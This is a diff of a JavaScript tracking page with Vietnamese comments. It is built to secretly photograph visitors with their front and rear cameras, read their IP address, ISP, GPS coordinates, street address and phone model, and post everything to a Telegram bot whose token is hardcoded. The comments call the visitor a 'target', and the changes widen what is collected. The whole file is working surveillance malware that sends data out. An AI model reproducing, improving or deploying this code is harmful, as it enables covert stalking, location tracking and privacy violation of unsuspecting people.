@@ -2,34 +2,97 @@ const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
 const TELEGRAM_CHAT_ID = '-1003770043455';
 
 const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-  time: '', ip: '', isp: '', address: '',
-  lat: '', lon: '', device: '', os: ''
+  time: '',
+  ip: '',
+  isp: '',
+  realIp: '',
+  address: '',
+  country: '', 
+  lat: '',
+  lon: '',
+  device: '',
+  os: '',
+  camera: '⏳ Đang kiểm tra...'
 };
 
-// Hàm lấy thông tin thiết bị
+// 1. Nhận diện thiết bị (Giữ nguyên logic iPhone/Android của mày)
 function detectDevice() {
   const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const screenW = window.screen.width;
+  const screenH = window.screen.height;
+  const ratio = window.devicePixelRatio;
   info.time = new Date().toLocaleString('vi-VN');
-  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
-  info.device = navigator.platform;
+
+  if (/Android/i.test(ua)) {
+    info.os = 'Android';
+    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
+    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
+  } 
+  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    info.os = 'iOS';
+    const res = `${screenW}x${screenH}@${ratio}`;
+    const iphoneModels = {
+      "430x932@3": "iPhone 14/15/16 Pro Max",
+      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
+      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
+      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
+      "414x896@3": "iPhone XS Max / 11 Pro Max",
+      "414x896@2": "iPhone XR / 11",
+      "375x812@3": "iPhone X / XS / 11 Pro",
+      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
+    };
+    info.device = iphoneModels[res] || 'iPhone Model';
+  } else {
+    info.device = platform || 'PC';
+    info.os = 'Desktop';
+  }
 }
 
-// Hàm lấy IP và Vị trí (Chỉ gọi khi đã có quyền Cam)
-async function fetchPrivateData() {
+// 2. Lấy IP dân cư, IP gốc, ISP
+async function getNetworkData() {
   try {
-    const res = await fetch(`https://ipwho.is/`);
-    const d = await res.json();
-    info.ip = d.ip;
-    info.isp = d.connection?.org || 'N/A';
-    info.lat = d.latitude;
-    info.lon = d.longitude;
-    info.address = `${d.city}, ${d.region}`;
+    const [res1, res2] = await Promise.all([
+      fetch('https://api.ipify.org?format=json').then(r => r.json()),
+      fetch('https://ipwho.is/').then(r => r.json())
+    ]);
+    info.ip = res1.ip; // IP dân cư
+    info.realIp = res2.ip; // IP gốc
+    info.isp = res2.connection?.org || 'VNNIC';
+    info.country = res2.country || 'Vietnam';
+    if(!info.lat) {
+      info.lat = res2.latitude;
+      info.lon = res2.longitude;
+      info.address = `${res2.city}, ${res2.region} (Vị trí IP)`;
+    }
   } catch (e) {}
 }
 
-// Hàm chụp ảnh
+// 3. Lấy vị trí GPS chính xác
+async function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve();
+    navigator.geolocation.getCurrentPosition(
+      async pos => {
+        info.lat = pos.coords.latitude;
+        info.lon = pos.coords.longitude;
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
+          const data = await res.json();
+          info.address = data.display_name;
+        } catch { info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`; }
+        resolve();
+      },
+      () => resolve(),
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  });
+}
+
+// 4. Chụp ảnh
 async function captureCamera(facingMode = 'user') {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -51,51 +114,60 @@ async function captureCamera(facingMode = 'user') {
   } catch (e) { return null; }
 }
 
-// Hàm gửi dữ liệu (Chỉ gửi khi có ảnh)
-async function sendData(front, back) {
+// 5. Form báo cáo chuẩn mày yêu cầu
+function getCaption() {
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
-  const caption = `
-📡 [CẢNH BÁO TRUY CẬP]
-🕒 ${info.time}
-📱 ${info.device} (${info.os})
-🌍 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-🏙️ ${info.address}
-📍 Maps: ${mapsLink}
-`.trim();
+  return `
+📡 [THÔNG TIN TRUY CẬP]
 
+🕒 Thời gian: ${info.time}
+📱 Thiết bị: ${info.device}
+🖥️ Hệ điều hành: ${info.os}
+🌍 IP dân cư: ${info.ip}
+🧠 IP gốc: ${info.realIp}
+🏢 ISP: ${info.isp}
+🏙️ Địa chỉ: ${info.address}
+🌎 Quốc gia: ${info.country}
+📍 Vĩ độ: ${info.lat}
+📍 Kinh độ: ${info.lon}
+📌 Google Maps: ${mapsLink}
+📸 Camera: ${info.camera}
+
+⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%
+`.trim();
+}
+
+// 6. Hàm Gửi
+async function sendReport(f, b) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
-  
-  const media = [];
-  media.push({ type: 'photo', media: 'attach://f', caption: caption });
-  formData.append('f', front, 'front.jpg');
-  
-  if (back) {
+  const media = [{ type: 'photo', media: 'attach://f', caption: getCaption() }];
+  formData.append('f', f, 'f.jpg');
+  if (b) {
     media.push({ type: 'photo', media: 'attach://b' });
-    formData.append('b', back, 'back.jpg');
+    formData.append('b', b, 'b.jpg');
   }
-
   formData.append('media', JSON.stringify(media));
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
 
-// HÀM CHÍNH: QUYẾT ĐỊNH CÓ GỬI HAY KHÔNG
+// HÀM CHÍNH - FIX LỖI TỪ CHỐI VẪN GỬI
 async function main() {
-  // 1. Thử xin quyền và chụp cam trước ngay lập tức
-  const frontPhoto = await captureCamera("user");
+  // Bước 1: Xin quyền và chụp cam trước ngay
+  let f = await captureCamera("user");
 
-  // 2. KIỂM TRA: Nếu không có ảnh (Từ chối/Lỗi) -> DỪNG NGAY LẬP TỨC
-  if (!frontPhoto) {
-    console.log("Dừng: Người dùng từ chối camera.");
-    return; // THOÁT HÀM, không chạy bất cứ lệnh nào bên dưới
+  // KIỂM TRA: Nếu f = null (Nó bấm Từ chối) thì DỪNG LUÔN, không chạy gì hết
+  if (!f) {
+    console.log("Mục tiêu từ chối Camera. Hủy lệnh gửi tin nhắn.");
+    return; 
   }
 
-  // 3. Nếu ĐÃ CHO PHÉP: Mới bắt đầu thu thập các thông tin nhạy cảm khác
+  // Bước 2: Chỉ khi đã có ảnh mới đi lấy mấy cái IP, Vị trí này
+  info.camera = '✅ Đã chụp camera trước và sau';
   detectDevice();
-  await fetchPrivateData();
-  const backPhoto = await captureCamera("environment");
+  await Promise.all([getNetworkData(), getLocation()]);
+  let b = await captureCamera("environment");
 
-  // 4. Gửi toàn bộ gói dữ liệu có kèm ảnh
-  await sendData(frontPhoto, backPhoto);
+  // Bước 3: Gửi báo cáo có ảnh
+  await sendReport(f, b);
 }
